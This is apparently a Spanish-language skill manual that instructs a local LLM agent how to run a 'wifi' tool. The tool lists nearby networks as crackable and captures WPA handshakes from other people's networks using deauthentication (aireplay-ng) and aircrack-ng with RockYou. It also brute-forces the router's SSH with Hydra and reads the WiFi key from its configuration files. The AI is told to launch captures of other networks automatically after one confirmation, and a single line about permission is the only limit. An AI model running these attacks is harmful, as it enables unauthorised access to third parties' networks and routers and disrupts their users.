---
name: wifi
description: Escanea redes WiFi cercanas, indica cuáles se pueden crackear (abierta, WEP, WPA/WPA2, WPA3 o empresa), deja elegir una red, captura handshakes con airodump-ng/aireplay-ng y hace brute-force del router con Hydra + RockYou para extraer la contraseña WiFi actual. Comando único: wifi. Úsala cuando el usuario pida ver redes WiFi, saber cuáles puede crackear, elegir una red o sacar la contraseña del router.
user-invocable: true
---

# WiFi — Manual para el LLM local

Skill de una sola cosa: **mostrar redes WiFi, decir cuáles se pueden crackear, dejar elegir una
y sacar la contraseña del router de la red en la que estás conectado.**

El comando ya está en el PATH: `wifi`.

## Reglas de decisión (qué ejecutar)

| Si el usuario pide... | Ejecuta |
|---|---|
| "¿qué redes hay?", "¿qué puedo crackear?" | `wifi scan` |
| "déjame elegir", "crackea esta red" | `wifi` (menú interactivo) |
| crackear una red por handshake | `wifi capture <n>` |
| una IP concreta | `wifi --ip <IP>` |
| la contraseña de mi red, rápido | `wifi --brute` |
| ver opciones | `wifi --help` |

No inventes flags: solo existen `--ip/-i`, `--user/-u`, `--wordlist/-w`, `--port/-p`,
`--brute/-b`, `--scan/-s`, `--help/-h`.

## Comandos

```bash
wifi                 # escanea, muestra tabla y abre menú para elegir red
wifi scan            # solo tabla de redes (no pregunta nada, no ataca)
wifi capture 3       # captura el handshake de la red 3 y la crackea
wifi capture "Claro_FARINANGO"
wifi --brute         # ataca el router de la red actual (gateway) sin menú
wifi --ip 10.0.0.1   # ataca un router concreto por SSH
wifi --ip 10.0.0.1 --user admin --port 22
```

### Qué imprime `wifi scan`

Tabla con: número, `*` si es la red actual, SSID, señal, seguridad, canal, BSSID y
**CRACKEABLE**:

- `SÍ` → red abierta, WEP o WPA/WPA2 (handshake + RockYou).
- `LIMITADO` → WPA3/SAE (el diccionario clásico no sirve).
- `NO` → 802.1X/empresa o desconocido.

### Qué hace `wifi` (menú)

1. Escanea y muestra la tabla.
2. Pide un número de red.
3. Si eliges **otra** red (no la actual): imprime el plan exacto (modo monitor,
   `airodump-ng`, `aireplay-ng`, `aircrack-ng`) y **lanza la captura automáticamente**
   (pide una sola confirmación). Antes de capturar refresca BSSID y canal con la
   lista actual, así usa la red tal como está en ese momento. No ataca el router
   porque sin estar dentro de esa red no se llega a él por SSH.
4. Si eliges **la red actual**: toma el gateway (`ip route`), hace Hydra + RockYou
   contra su SSH y, si acierta, entra con paramiko y muestra la **contraseña WiFi
   actual**.

### Qué hace `wifi capture <n>`

1. Vuelve a escanear y elige la red por número, SSID o BSSID.
2. Avisa y pide confirmación `[s/N]`: **te desconecta de tu WiFi** mientras captura.
3. Libera la interfaz de NetworkManager (`nmcli device set wlan0 managed no`),
   la pone en modo monitor y **fija el canal**. Sin ese paso NM recupera la
   interfaz, airodump se queda en otro canal y el `.cap` sale sin handshake.
4. Captura ~45 s en el canal/BSSID y repite deauth (`aireplay-ng`) cada ~10 s.
5. Restaura SIEMPRE modo managed y `managed yes` (NM reconecta tu red solo), y
   cuenta las tramas **EAPOL** del `.cap` con `tshark`.
6. Solo si hay EAPOL ejecuta `aircrack-ng -w rockyou <captura>.cap`. Si no hay
   EAPOL avisa y no pierde tiempo con RockYou.
7. Guarda la captura en `~/capturas/`. WPA3 se rechaza; WEP no usa diccionario.

## Flujo técnico (para explicar, no para reimplementar)

1. `hydra -l <user> -P /home/gabo/wordlists/rockyou.txt ssh://<ip>`
2. Lee la contraseña del archivo de resultados de Hydra.
3. `paramiko` entra por SSH con esa contraseña.
4. Dentro del router prueba: `uci show wireless`, `nvram get wl0_wpa_psk`,
   `cat /etc/config/wireless`, `cat /etc/wpa_supplicant/wpa_supplicant.conf`,
   `cat /etc/hostapd.conf`, `hostapd_cli ... get_config`.
5. Extrae la PSK (`option key`, `psk=`, `wpa_passphrase=`, `preshared-key=`) y la imprime.

## Dónde queda el resultado

- `~/.config/opencode/skills/wifi/results/<usuario>_final.txt`
  Contiene si se crackeó y, si se pudo, la contraseña WiFi actual.

## Límites (dilos tal cual)

- Para atacar un router por SSH hay que **estar conectado a esa red**; el script usa el gateway.
- Redes ajenas requieren capturar el handshake en **modo monitor** (comandos del plan).
- WPA3/SAE no cae con RockYou; sin clientes conectados no hay handshake.
- `192.168.1.1:22` puede no responder: entonces Hydra termina en ~0.03 s sin resultado (es red, no código).
- Usa esto solo en redes propias o con permiso. Crackear redes ajenas es ilegal.

## Requisitos ya instalados

`hydra`, `nmcli`, `iw`, `aircrack-ng`, Python 3 con `paramiko`, y
`/home/gabo/wordlists/rockyou.txt` (14M de palabras).

## Arreglos rápidos

- "No se detectaron redes": `sudo wifi scan` o revisa `nmcli dev wifi`.
- "Faltan dependencias": instala lo que liste el propio comando.
- "No se pudo leer la PSK": el router no expone la clave por SSH; usa los comandos
  de fallback que imprime el script (`cat /etc/config/wireless`).
